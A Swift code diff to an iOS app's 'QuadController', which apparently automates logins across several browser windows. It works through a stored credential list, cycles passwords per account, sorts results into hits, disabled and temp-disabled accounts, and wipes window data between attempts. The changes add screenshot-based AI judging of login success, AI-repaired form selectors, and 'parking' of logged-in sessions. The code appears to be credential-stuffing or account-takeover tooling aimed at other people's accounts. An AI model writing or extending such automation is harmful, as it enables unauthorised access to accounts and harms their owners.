@@ -332,6 +332,8 @@ final class QuadController {
         guard !anyRCRRunning, !isStartingRCR else { return }
         guard let context = modelContext else { return }
         dualQuadActive = false
+        FillHealerEngine.shared.resetRunBudget()
+        ParkedSessionStore.shared.markRunStarted()
         let descriptor = FetchDescriptor<Credential>(
             sortBy: [
                 SortDescriptor(\Credential.domain),
@@ -481,6 +483,7 @@ final class QuadController {
             s.rcrStatus = .idle
             s.rcrAwaitingNavigation = false
             s.rcrExtraSubmitsInFlight = false
+            s.rcrJudging = false
             s.needsPostBurnSettle = false
             s.webView?.evaluateJavaScript(
                 JavaScriptInjectionService.rcrUninstallObserverScript(),
@@ -502,6 +505,7 @@ final class QuadController {
         laneCompletedCounts = Array(repeating: 0, count: laneCount)
         dualNeedsBurn = [:]
         if let reason { browserViewModel?.showToast(reason) }
+        ParkedSessionStore.shared.markRunFinished()
     }
 
     private func currentCredential(_ session: QuadSession) -> Credential? {
@@ -698,12 +702,11 @@ final class QuadController {
         )
         let fillResult = try? await s.webView?.evaluateJavaScript(fillScript)
 
-        // Self-healing (Part 3): AI repairs stuck selector sets — verified,
-        // bounded, and skipped on captcha/lockout pages.
+        var healedSubmitSelector: String? = nil
         if FillHealerEngine.fillMissed(fillResult),
            let webView = s.webView,
            let context = self.modelContext {
-            _ = await FillHealerEngine.shared.healAndRefill(
+            let outcome = await FillHealerEngine.shared.healAndRefill(
                 webView: webView,
                 domain: targetDomain,
                 sessionTag: s.sessionTag,
@@ -711,11 +714,12 @@ final class QuadController {
                 password: password,
                 modelContext: context
             )
+            healedSubmitSelector = outcome?.submitSelector
         }
 
         s.rcrStatus = .submitting
         let submitScript = JavaScriptInjectionService.submitFormScript(
-            submitSelector: siteSetting?.submitButtonSelector
+            submitSelector: healedSubmitSelector ?? siteSetting?.submitButtonSelector
         )
         _ = try? await s.webView?.evaluateJavaScript(submitScript)
 
@@ -786,15 +790,7 @@ final class QuadController {
         }
         guard s.rcrRunning, s.rcrStatus == .waiting else { return }
         if s.rcrExtraSubmitsInFlight { return }
-        // NOTE: the watchdog stays armed on purpose — an actionable payload
-        // advances the run (which re-arms), while a page that mutates
-        // without ever resolving still needs the watchdog to fire.
-        let hasPassword = payload["hasPassword"] as? Bool ?? false
-        let hasWelcome = payload["hasWelcome"] as? Bool ?? false
-        let hasDisabled = payload["hasDisabled"] as? Bool ?? false
-        let hasTempDisabled = payload["hasTempDisabled"] as? Bool ?? false
-        let hasSuccess = payload["hasSuccess"] as? Bool ?? false
-        let isHomepage = payload["isHomepage"] as? Bool ?? false
+        if s.rcrJudging { return }
 
         guard let credential = currentCredential(s) else {
             s.rcrIndex += 1
@@ -803,63 +799,171 @@ final class QuadController {
         }
 
         let password = s.rcrPasswords[safe: s.rcrPasswordIndex] ?? ""
+        let signal = SuccessJudgeEngine.classifyLocal(payload)
 
-        if hasWelcome || hasSuccess || (isHomepage && !hasPassword) {
+        switch signal {
+        case .disabled:
+            applyLocalDisabled(session: s, credential: credential, password: password)
+        case .tempDisabled:
+            applyLocalTempDisabled(session: s, credential: credential, password: password)
+        case .stillOnLogin:
+            ParkedSessionStore.shared.recordFailure()
+            captureAndRecord(session: s, credential: credential, password: password, status: .failed)
+            advanceAfterFailure(session: s, credential: credential)
+        case .apparentSuccess, .unclear:
+            s.rcrJudging = true
+            cancelRCRWatchdog(for: s)
+            let credID = credential.id
+            Task {
+                await self.judgeAndAdvance(session: s, payload: payload, credentialID: credID, password: password)
+                s.rcrJudging = false
+            }
+        }
+    }
+
+    private func applyLocalDisabled(session s: QuadSession, credential: Credential, password: String) {
+        ParkedSessionStore.shared.recordFailure()
+        PermaDisabledStore.shared.markDisabled(credentialID: credential.id)
+        captureAndRecord(session: s, credential: credential, password: password, status: .disabled)
+        let deletedID = credential.id
+        deleteCredentialPermanently(credential)
+        Task { await self.burnAndAdvance(session: s, completedID: deletedID) }
+    }
+
+    private func applyLocalTempDisabled(session s: QuadSession, credential: Credential, password: String) {
+        captureAndRecord(session: s, credential: credential, password: password, status: .tempDisabled)
+        if s.rcrPasswords.count > 1 {
+            TempDisabledStore.shared.markDisabled(credentialID: credential.id)
+            browserViewModel?.showToast("Temp-disabled — \(credential.username)")
+        }
+        s.rcrCompletedIDs.insert(credential.id)
+        s.rcrIndex += 1
+        s.rcrPasswordIndex = 0
+        Task { await self.runCurrent(session: s) }
+    }
+
+    private func advanceAfterFailure(session s: QuadSession, credential: Credential) {
+        if s.rcrPasswordIndex + 1 < s.rcrPasswords.count {
+            s.rcrPasswordIndex += 1
+            Task { await self.attemptFill(session: s) }
+        } else {
+            s.rcrCompletedIDs.insert(credential.id)
+            s.rcrIndex += 1
+            s.rcrPasswordIndex = 0
+            Task { await self.runCurrent(session: s) }
+        }
+    }
+
+    private func judgeAndAdvance(
+        session s: QuadSession,
+        payload: [String: Any],
+        credentialID: String,
+        password: String
+    ) async {
+        guard s.rcrRunning else { return }
+        guard let credential = currentCredential(s), credential.id == credentialID else { return }
+        let image = await WebViewSnapshotter.capture(s.webView)
+        let filename = image.flatMap { ScreenshotStorage.save($0) }
+        let domain = s.rcrTargetURL?.host(percentEncoded: false)?.lowercased() ?? credential.domain
+        let decision = await SuccessJudgeEngine.judge(
+            payload: payload,
+            image: image,
+            domain: domain,
+            sessionTag: s.sessionTag
+        )
+        recordOutcome(
+            session: s,
+            credential: credential,
+            password: password,
+            status: decision.status,
+            filename: filename,
+            judge: decision
+        )
+
+        switch decision.status {
+        case .disabled:
+            applyLocalDisabled(session: s, credential: credential, password: password)
+        case .tempDisabled:
+            applyLocalTempDisabled(session: s, credential: credential, password: password)
+        case .failed, .pending, .skipped:
+            ParkedSessionStore.shared.recordFailure()
+            advanceAfterFailure(session: s, credential: credential)
+        case .review:
+            s.rcrCompletedIDs.insert(credential.id)
+            s.rcrIndex += 1
+            s.rcrPasswordIndex = 0
+            Task { await self.runCurrent(session: s) }
+        case .success:
             s.rcrSuccessCount += 1
             s.rcrStatus = .success
             s.rcrCompletedIDs.insert(credential.id)
-            captureAndRecord(session: s, credential: credential, password: password, status: .success)
             s.rcrIndex += 1
             s.rcrPasswordIndex = 0
-            Task { await self.runCurrent(session: s) }
-            return
-        }
-
-        if hasDisabled {
-            PermaDisabledStore.shared.markDisabled(credentialID: credential.id)
-            captureAndRecord(session: s, credential: credential, password: password, status: .disabled)
-            // Capture before deletion — reading a property off a deleted
-            // SwiftData model can fault.
-            let deletedID = credential.id
-            deleteCredentialPermanently(credential)
-            Task { await self.burnAndAdvance(session: s, completedID: deletedID) }
-            return
-        }
-
-        if hasTempDisabled {
-            captureAndRecord(session: s, credential: credential, password: password, status: .tempDisabled)
-            // Park the credential for its cooldown only when more passwords
-            // remain; with one password it advances like a normal failure.
-            if s.rcrPasswords.count > 1 {
-                TempDisabledStore.shared.markDisabled(credentialID: credential.id)
-                browserViewModel?.showToast("Temp-disabled — \(credential.username)")
-            }
-            s.rcrCompletedIDs.insert(credential.id)
-            s.rcrIndex += 1
-            s.rcrPasswordIndex = 0
-            Task { await self.runCurrent(session: s) }
-            return
-        }
-
-        if hasPassword {
-            captureAndRecord(session: s, credential: credential, password: password, status: .failed)
-            if s.rcrPasswordIndex + 1 < s.rcrPasswords.count {
-                s.rcrPasswordIndex += 1
-                Task { await self.attemptFill(session: s) }
+            if decision.shouldPark {
+                parkSession(s, credential: credential, thumbnail: image)
+                if s.rcrIndex >= s.rcrTotal {
+                    s.rcrRunning = false
+                    s.rcrStatus = .finished
+                    checkAllFinished()
+                    return
+                }
+                s.rcrAwaitingNavigation = true
+                s.rcrStatus = .navigating
+                armRCRWatchdog(for: s)
             } else {
-                s.rcrCompletedIDs.insert(credential.id)
-                s.rcrIndex += 1
-                s.rcrPasswordIndex = 0
                 Task { await self.runCurrent(session: s) }
             }
         }
+    }
+
+    private func parkSession(_ s: QuadSession, credential: Credential, thumbnail: UIImage?) {
+        _ = ParkedSessionStore.shared.park(
+            storeID: s.storeID,
+            url: s.webView?.url ?? s.url,
+            username: credential.username,
+            domain: s.rcrTargetURL?.host(percentEncoded: false)?.lowercased() ?? credential.domain,
+            credentialID: credential.id,
+            sessionTag: s.sessionTag,
+            thumbnail: thumbnail,
+            sourceWindowIndex: s.index
+        )
+        s.adoptFreshStore()
+        s.url = s.rcrTargetURL
+    }
+
+    private func recordOutcome(
+        session s: QuadSession,
+        credential: Credential,
+        password: String,
+        status: AttemptRecord.Status,
+        filename: String?,
+        judge: SuccessJudgeEngine.Decision?
+    ) {
+        guard let context = modelContext else { return }
+        _ = AttemptTrackingService.shared.recordAttempt(
+            context: context,
+            credentialID: credential.id,
+            username: credential.username,
+            password: password,
+            passwordIndex: s.rcrPasswordIndex + 1,
+            passwordTotal: s.rcrPasswords.count,
+            targetDomain: s.rcrTargetURL?.host(percentEncoded: false)?.lowercased() ?? credential.domain,
+            sessionTag: s.sessionTag,
+            status: status,
+            resultURL: s.webView?.url?.absoluteString,
+            resultPageTitle: s.webView?.title,
+            screenshotFilename: filename,
+            judge: judge
+        )
     }
 
     private func burnAndAdvance(session s: QuadSession, completedID: String) async {
         s.rcrStatus = .burning
         s.rcrBurnFlash &+= 1
         WindowDiagnosticsService.shared.noteBurn(session: s)
-        await QuadDataStore.burn(index: s.index)
+        if !ParkedSessionStore.shared.contains(storeID: s.storeID) {
+            await QuadDataStore.burn(dataStoreID: s.storeID)
+        }
         s.rcrCompletedIDs.insert(completedID)
         s.rcrIndex += 1
         s.rcrPasswordIndex = 0
@@ -953,6 +1057,7 @@ final class QuadController {
         guard allDone else { return }
         let totalSuccess = enabledSessions.reduce(0) { $0 + $1.rcrSuccessCount }
         let totalTried = enabledSessions.reduce(0) { $0 + $1.rcrTotal }
+        ParkedSessionStore.shared.markRunFinished()
         browserViewModel?.showToast("Quad RCR complete — \(totalSuccess) hits / \(totalTried) tried")
     }
 
@@ -1159,6 +1264,8 @@ final class QuadController {
     func startDualQuadRCR(urlA: URL, urlB: URL) {
         guard !anyRCRRunning, !isStartingRCR else { return }
         guard let context = modelContext else { return }
+        FillHealerEngine.shared.resetRunBudget()
+        ParkedSessionStore.shared.markRunStarted()
         let descriptor = FetchDescriptor<Credential>(
             sortBy: [
                 SortDescriptor(\Credential.domain),
@@ -1437,7 +1544,9 @@ final class QuadController {
             dualNeedsBurn[s.index] = false
             s.rcrStatus = .burning
             s.rcrBurnFlash &+= 1
-            await QuadDataStore.burn(index: s.index)
+            if !ParkedSessionStore.shared.contains(storeID: s.storeID) {
+                await QuadDataStore.burn(dataStoreID: s.storeID)
+            }
             guard dualQuadActive, s.rcrRunning else { return }
             s.needsPostBurnSettle = true
             s.rcrStatus = .navigating
@@ -1481,10 +1590,11 @@ final class QuadController {
         )
         let fillResult = try? await s.webView?.evaluateJavaScript(fillScript)
 
+        var healedSubmitSelector: String? = nil
         if FillHealerEngine.fillMissed(fillResult),
            let webView = s.webView,
            let context = self.modelContext {
-            _ = await FillHealerEngine.shared.healAndRefill(
+            let outcome = await FillHealerEngine.shared.healAndRefill(
                 webView: webView,
                 domain: targetDomain,
                 sessionTag: s.sessionTag,
@@ -1492,11 +1602,12 @@ final class QuadController {
                 password: password,
                 modelContext: context
             )
+            healedSubmitSelector = outcome?.submitSelector
         }
 
         s.rcrStatus = .submitting
         let submitScript = JavaScriptInjectionService.submitFormScript(
-            submitSelector: siteSetting?.submitButtonSelector
+            submitSelector: healedSubmitSelector ?? siteSetting?.submitButtonSelector
         )
         _ = try? await s.webView?.evaluateJavaScript(submitScript)
 
@@ -1556,51 +1667,30 @@ final class QuadController {
     private func handleDualQuadMessage(session s: QuadSession, payload: [String: Any]) {
         guard dualQuadActive, s.rcrRunning, s.rcrStatus == .waiting else { return }
         if s.rcrExtraSubmitsInFlight { return }
-        // NOTE: watchdog stays armed — see handleRCRMessage.
+        if s.rcrJudging { return }
         let lane = laneIndex(for: s)
         guard let credential = currentDualCredential(s) else {
             finishDualSide(session: s, lane: lane, status: .failed)
             return
         }
-
-        let hasPassword = payload["hasPassword"] as? Bool ?? false
-        let hasWelcome = payload["hasWelcome"] as? Bool ?? false
-        let hasDisabled = payload["hasDisabled"] as? Bool ?? false
-        let hasTempDisabled = payload["hasTempDisabled"] as? Bool ?? false
-        let hasSuccess = payload["hasSuccess"] as? Bool ?? false
-        let isHomepage = payload["isHomepage"] as? Bool ?? false
         let password = s.rcrPasswords[safe: s.rcrPasswordIndex] ?? ""
+        let signal = SuccessJudgeEngine.classifyLocal(payload)
 
-        if hasWelcome || hasSuccess || (isHomepage && !hasPassword) {
-            s.rcrSuccessCount += 1
-            s.rcrStatus = .success
-            captureAndRecord(session: s, credential: credential, password: password, status: .success)
-            browserViewModel?.showToast("Login succeeded — \(credential.username)")
-            finishDualSide(session: s, lane: lane, status: .success)
-            return
-        }
-
-        if hasDisabled {
+        switch signal {
+        case .disabled:
+            ParkedSessionStore.shared.recordFailure()
             captureAndRecord(session: s, credential: credential, password: password, status: .disabled)
-            // Defer the actual burn until this window is reused for the
-            // lane's next credential — avoids burning while still waiting
-            // on the partner side.
             dualNeedsBurn[s.index] = true
             finishDualSide(session: s, lane: lane, status: .disabled)
-            return
-        }
-
-        if hasTempDisabled {
+        case .tempDisabled:
             captureAndRecord(session: s, credential: credential, password: password, status: .tempDisabled)
             if s.rcrPasswords.count > 1 {
                 TempDisabledStore.shared.markDisabled(credentialID: credential.id)
                 browserViewModel?.showToast("Temp-disabled — \(credential.username)")
             }
             finishDualSide(session: s, lane: lane, status: .tempDisabled)
-            return
-        }
-
-        if hasPassword {
+        case .stillOnLogin:
+            ParkedSessionStore.shared.recordFailure()
             captureAndRecord(session: s, credential: credential, password: password, status: .failed)
             if s.rcrPasswordIndex + 1 < s.rcrPasswords.count {
                 s.rcrPasswordIndex += 1
@@ -1608,6 +1698,71 @@ final class QuadController {
             } else {
                 finishDualSide(session: s, lane: lane, status: .failed)
             }
+        case .apparentSuccess, .unclear:
+            s.rcrJudging = true
+            cancelRCRWatchdog(for: s)
+            let credID = credential.id
+            Task {
+                await self.judgeDualAndAdvance(session: s, lane: lane, payload: payload, credentialID: credID, password: password)
+                s.rcrJudging = false
+            }
+        }
+    }
+
+    private func judgeDualAndAdvance(
+        session s: QuadSession,
+        lane: Int,
+        payload: [String: Any],
+        credentialID: String,
+        password: String
+    ) async {
+        guard dualQuadActive, s.rcrRunning else { return }
+        guard let credential = currentDualCredential(s), credential.id == credentialID else { return }
+        let image = await WebViewSnapshotter.capture(s.webView)
+        let filename = image.flatMap { ScreenshotStorage.save($0) }
+        let domain = s.rcrTargetURL?.host(percentEncoded: false)?.lowercased() ?? credential.domain
+        let decision = await SuccessJudgeEngine.judge(
+            payload: payload,
+            image: image,
+            domain: domain,
+            sessionTag: s.sessionTag
+        )
+        recordOutcome(
+            session: s,
+            credential: credential,
+            password: password,
+            status: decision.status,
+            filename: filename,
+            judge: decision
+        )
+
+        switch decision.status {
+        case .disabled:
+            ParkedSessionStore.shared.recordFailure()
+            dualNeedsBurn[s.index] = true
+            finishDualSide(session: s, lane: lane, status: .disabled)
+        case .tempDisabled:
+            if s.rcrPasswords.count > 1 {
+                TempDisabledStore.shared.markDisabled(credentialID: credential.id)
+            }
+            finishDualSide(session: s, lane: lane, status: .tempDisabled)
+        case .failed, .pending, .skipped:
+            ParkedSessionStore.shared.recordFailure()
+            if s.rcrPasswordIndex + 1 < s.rcrPasswords.count {
+                s.rcrPasswordIndex += 1
+                Task { await self.attemptFillDual(session: s, lane: lane) }
+            } else {
+                finishDualSide(session: s, lane: lane, status: .failed)
+            }
+        case .review:
+            finishDualSide(session: s, lane: lane, status: .review)
+        case .success:
+            s.rcrSuccessCount += 1
+            s.rcrStatus = .success
+            if decision.shouldPark {
+                parkSession(s, credential: credential, thumbnail: image)
+            }
+            finishDualSide(session: s, lane: lane, status: .success)
         }
     }
 
@@ -1641,7 +1796,7 @@ final class QuadController {
             return
         }
 
-        let keepStatuses: Set<AttemptRecord.Status> = [.success, .tempDisabled]
+        let keepStatuses: Set<AttemptRecord.Status> = [.success, .tempDisabled, .review]
         let isRemovalSafe = (resultA == .disabled || resultB == .disabled)
             && !keepStatuses.contains(resultA)
             && !keepStatuses.contains(resultB)
@@ -1679,6 +1834,7 @@ final class QuadController {
         dualQuadActive = false
         let totalSuccess = enabledSessions.reduce(0) { $0 + $1.rcrSuccessCount }
         let totalTried = laneStates.reduce(0) { $0 + $1.credentials.count }
+        ParkedSessionStore.shared.markRunFinished()
         browserViewModel?.showToast("Dual RCR complete — \(totalSuccess) hits / \(totalTried) tried")
     }
 }
